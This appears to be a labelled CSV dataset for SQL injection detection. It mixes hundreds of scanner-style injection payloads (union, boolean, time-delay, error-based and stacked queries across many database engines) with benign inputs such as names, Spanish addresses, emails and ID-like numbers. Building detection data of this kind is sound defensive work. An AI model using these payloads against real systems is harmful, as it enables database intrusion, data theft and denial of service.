Query,Label
"1%"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",1
torremocha de jiloca,0
l-e3a06l,0
delaune@tintasultravioleta.io,0
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
50546,0
lora de estepa,0
yueh.frasco@granbretana.com.hk,0
pious-muszte9@prestigecars.sg,0
v9n939z6,0
-9358' or 9887=2569--,1
-7552 or 6872=6872,1
urgel,0
"-4798""))) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy",1
1133130881623845,0
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',1
4233,0
"-2916"")) or 4946=8232--",1
nesserin,0
m1n*6848,0
castellanos gdia,0
43783,0
daya basulto,0
castellser,0
1%') rlike (select (case when (1210=8664) then 1 else 0x28 end)) and ('%'=',1
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null#",1
"1) as pcnd where 4589=4589 union all select null,null,null,null,null,null,null,null,null,null--",1
"1%"") and elt(3114=3114,sleep(5))#",1
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
itero de la vega,0
"1"")) as gawq where 4728=4728 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
8320964749931174,0
jamshidi,0
"1"") where 4849=4849 or 8421=(select count(*) from generate_series(1,5000000))--",1
aras de los olmos,0
aldemar,0
77603o8ada,0
"1"") as ronb where 9368=9368;(select * from (select(sleep(5)))srmq)--",1
"1"")) as azak where 4911=4911;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1755430975595986,0
19119,0
60996626m,0
sabety,0
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",1
1') and 3560=5467--,1
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""nepk""=""nepk",1
valverde,0
-2129') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('eutm' like 'eutm,1
clee3@ac-activos.sr,0
rasmia,0
agalladura,0
4411352716208406,0
"cuesta sal, 171, 5?a",0
casas de san galindo,0
1'||(select 'boxx' where 2038=2038 and 9198=9198--,1
8451,0
mehd3,0
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
8708,0
-6890')) or 5771=7721--,1
"cami ses vinyes, 25",0
"c/ coronel cervio nuez, 35 3-c",0
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1
villanueva de duero,0
"1"")) as hbfi where 4773=4773 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1""));begin dbms_lock.sleep(5); end and ((""rqay"" like ""rqay",1
"1"") where 9223=9223 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
"calle secretario aguilar 196, 4-c",0
8860654392526309,0
polo@familiamarino.bn,0
riega girme,0
20500,0
mo!ralidad,0
freeley,0
"etorbidea atarrabiako 126, 5d",0
servidio,0
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",1
floor@aebo.af,0
1804467528403939,0
dekeyser@creacionwebs.bn,0
"1))) union all select null,null,null,null,null#",1
rom.val@rpdkorea.eg,0
17867,0
monette,0
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"plza. antonio mairena, 80,",0
flor chino,0
erfani,0
cuarter8da,0
55235483v,0
69393006m,0
gema,0
"diamante, 114,",0
husky_hurlic@ropadegolf.sn,0
cerd24a,0
"castillo de malpica 119,",0
31253,0
9184060552279623,0
toinette,0
barnechea,0
"calle maria marin, 196,",0
alsina aranguren,0
"1'+(select 'sbvh' where 8539=8539 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",1
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,1
"1))) union all select null,null,null#",1
7146,0
07947301l,0
mehboob,0
"1%""))) order by 1--",1
veracruz,0
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1';select (case when (2352=8672) then 2352 else 2352*(select 2352 from information_schema.character_sets) end)#,1
c/ san ildefonso 106 10?h,0
"1) as mwcs where 2544=2544 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
"1) or elt(6272=6272,sleep(5)) and (8600=8600",1
sansalva farreron,0
sobaquera,0
lapchak9,0
gilburt,0
jiinshuh,0
1');select case when 7717=7717 then 1 else null end--,1
"cami terminal s/n,",0
ledenburg.clapp@serviconlevante.museum,0
"calle sant pau, 117,",0
ittaly,0
kong-que,0
priado,0
spruance@maquillajeparalabios.ro,0
rupit i pruit,0
"1"") where 1001=1001 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
01062744y,0
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,1
1';select pg_sleep(5) and 'zfyy'='zfyy,1
5urgui8a,0
"-3300' union all select 8979,8979,8979,8979,8979,8979--",1
-8404)) order by 1--,1
"carrero boix, 112, 3?d",0
"-3377"") or 4982=6608#",1
1) where 4780=4780;begin dbms_lock.sleep(5); end--,1
quality,0
1');select pg_sleep(5),1
50780,0
6569,0
"c/ arquitecto ricardo velazquez bosco, 127, 3g",0
"1)) as oywa where 7951=7951 union all select null,null,null,null,null,null#",1
wines@interanuncios.sn,0
77447105x,0
palera,0
p563l5os1,0
"1' in boolean mode) union all select null,null,null,null,null,null,null,null#",1
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",1
"1') as hwpf where 5603=5603;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"praza pascasio fernandez seguin, 73,",0
dearly@evelin.ge,0
"1') as sjzi where 8242=8242 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
kepinska@manuelpaloma.asia,0
navares de ayuso,0
nidya,0
gold.medwin@maridosadomicilio.no,0
93tip72ar,0
.raijo,0
25514,0
c/ enrique mensaque 95,0
1));begin dbms_lock.sleep(5); end and ((2160=2160,1
oleilnikov_balasko@hostprofessional.ac,0
60613075w,0
22193,0
gaylord,0
"1%"")));begin user_lock.sleep(5); end--",1
gullera,0
janisch4@ebaz.museum,0
ladn,0
durovic,0
-1375'))) or (1226=9648)*9648 and ((('kfoy' like 'kfoy,1
magdalena,0
"1')) as fbjd where 8597=8597;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
51780892a,0
acachorrar,0
"-1425"") where 8056=8056 or elt(1032=1032,3623)--",1
schouwen,0
"zafiro, s/n 4?b",0
seyler@miami-beach.gw,0
charlot@ringringrent.rw,0
kesling8,0
caleruega,0
"-5224') where 1962=1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1
blanc hormachea,0
alma,0
10410049l,0
1));select pg_sleep(5)--,1
soubier.roudenko@mtos.is,0
1%' and sleep(5) and '%'=',1
"1'+(select 'qpxk' where 7139=7139 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",1
1%'))) and 4595=4595#,1
copleston-guerrasio@risiberia.ng,0
"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
kaz,0
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,1
falicov,0
rond,0
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",1
6552399616832844,0
1));(select * from (select(sleep(5)))acdk)#,1
"-1807')) union all select 9853,9853,9853,9853,9853,9853#",1
1'+(select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
"-2007' where 9157=9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1
orce,0
1' in boolean mode) and 2006=2006,1
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
atea,0
lumb2osa,0
volonghi@tacticlinks.com.bn,0
5exas9labo,0
"1'||(select 'pzto' from dual where 7338=7338 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",1
"1') and 2388=benchmark(5000000,md5(0x6d457153))#",1
lantz,0
peuela sains,0
ferrandez cabaas,0
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
chunshin,0
yuste,0
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (9509=9509",1
07694,0
poblete fiuza,0
"pasaje cox 194, 5?f",0
bablica,0
swope,0
1';select pg_sleep(5),1
-4104%' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'=',1
47670,0
rosquiller3,0
5068023807822442,0
paine,0
32783648t,0
1)) as mlpf where 7425=7425;select sleep(5)--,1
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#",1
1'))) and (select * from (select(sleep(5)))fzno) and ((('acml' like 'acml,1
torremocha del campo,0
periodista jose ventura traveset 4 5b,0
"-6198"") or make_set(3602=2178,2178) and (""xksq"" like ""xksq",1
moral3@fotoseroticas.com.ca,0
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
calle torreta 126 9c,0
"-5560"")) or 7292=6184#",1
"-9150%'))) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",1
goubanov@delujos.bg,0
"calle vizcaya, 101 10?f",0
61371247w,0
389,0
"-5969"" where 9248=9248 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
8647634867681270,0
"1%"" and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
talonera,0
gorostidi ponce,0
butts@maxtienda.na,0
didier,0
4279654044611256,0
"-7794"") union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1
armero filippi,0
hoggatt,0
a0r4g7,0
varia,0
-6215') or (8459=8459)*4906,1
kelkar,0
3110,0
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",1
64733615t,0
lizzi,0
"1')) as xjen where 6791=6791 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
adelina,0
0estot32,0
4973,0
75106972n,0
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'fpaf'='fpaf",1
l9n0e7no,0
allegra,0
frankfather@andrestabernero.dj,0
"1') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
22367,0
env+olvente,0
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('ochr' like 'ochr",1
stokoski,0
"-8824%')) or make_set(9354=9354,7185) and (('%'='",1
8795473491595155,0
51858384p,0
"tres villas, las",0
-5229')) as tkqp where 9253=9253 or 9323=9323#,1
-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),1
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
1'+(select 'iify' where 6257=6257 or 6793=(select 6793 from pg_sleep(5)))+',1
0650065659557709,0
66091214r,0
"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-3865') union all select 4935,4935,4935,4935,4935--",1
"-8735')) union all select 3262,3262,3262--",1
"1) as qodq where 4945=4945 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
intxaurraga,0
eric3@familiamarino.sh,0
"1"")) and make_set(8266=9226,9226) and ((""omjx"" like ""omjx",1
2111805626623658,0
1')) order by 1--,1
1'+(select 'stsu' where 2386=2386 or sleep(5)#,1
63eb2ya,0
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",1
fuentes calientes,0
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz",1
iciar,0
-5970' where 2769=2769 union all select 2769--,1
michalowski@lodgeinmadrid.mu,0
"galileo, 76, 6-a",0
kolski,0
"1'+(select 'bmit' where 3716=3716 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",1
nima,0
louladak,0
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('qtul' like 'qtul,1
"-4527' union all select 7115,7115#",1
"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
6048554064822313,0
sendra rull,0
1') as rhvm where 1420=1420;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
camas,0
95!6a752a,0
1'||(select 'awba' from dual where 3749=3749 and 1445=3334--,1
50366,0
telmaco,0
"1')) as jvwq where 6596=6596 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""ynde""=""ynde",1
necforo,0
"1"") as pobe where 1704=1704;begin dbms_lock.sleep(5); end--",1
13591,0
41240,0
43761,0
33,0
2001127126954456,0
valdelcubo,0
munch_velazquez@hiperzaragoza.tk,0
"1 and elt(4249=4249,7259)",1
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
fedora,0
6959239796912888,0
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",1
"1"";select (case when (1961=2048) then 1961 else 1961*(select 1961 from information_schema.character_sets) end)#",1
mcnear.trotta@lettere.ve,0
cairisti,0
(select (case when (6581=6581) then 1 else cast(1 as int)/(select 0 from dual) end) from dual),1
madisett,0
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
-5134))) or 8571=8571--,1
1';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
fernald,0
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
castell sargatal,0
nahiara,0
"1)) as fwru where 5262=5262 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
josee,0
"pedrosas, las",0
62955100y,0
portal tauler,0
legris@beautifulbody.yu,0
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",1
"1))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2952=2952",1
galdino,0
41850,0
cresta-da,0
1)) rlike sleep(5) and ((8773=8773,1
"-5425 where 5933=5933 union all select 5933,5933,5933--",1
"-9959"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vcwc""=""vcwc",1
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",1
"plaa verdum 144,",0
danning-marrow@etxarriaranatz.nr,0
22859316f,0
1%');select (case when (9986=8342) then 9986 else 9986*(select 9986 from information_schema.character_sets) end)#,1
24604865v,0
villafranca del bierzo,0
-3750'+(select alpu where 3911=3911 order by 1--,1
"1"") where 3390=3390;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",1
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1
"calle castilla, 142 11?c",0
"1) union all select null,null,null,null,null,null,null,null,null#",1
19782471x,0
24443,0
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
"1%"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
cathey@100mbps.gs,0
56163821y,0
matsumiya stuyck,0
60219106t,0
zaldua taranco,0
8679,0
"1%' union all select null,null--",1
22961726k,0
-4615' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),1
hartmann@softstylestudio.sa,0
"-5148"")) or 5310=8229",1
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""=""eaqk",1
aristin,0
"-3393"")) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1
tacita,0
villasandino,0
montsech peleij,0
7802564599685177,0
cedo rosa's,0
40190,0
comalada,0
"1%""));select (case when (3486=6373) then 3486 else 3486*(select 3486 from mysql.db) end)#",1
estellesa,0
05141,0
86535075j,0
"1))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
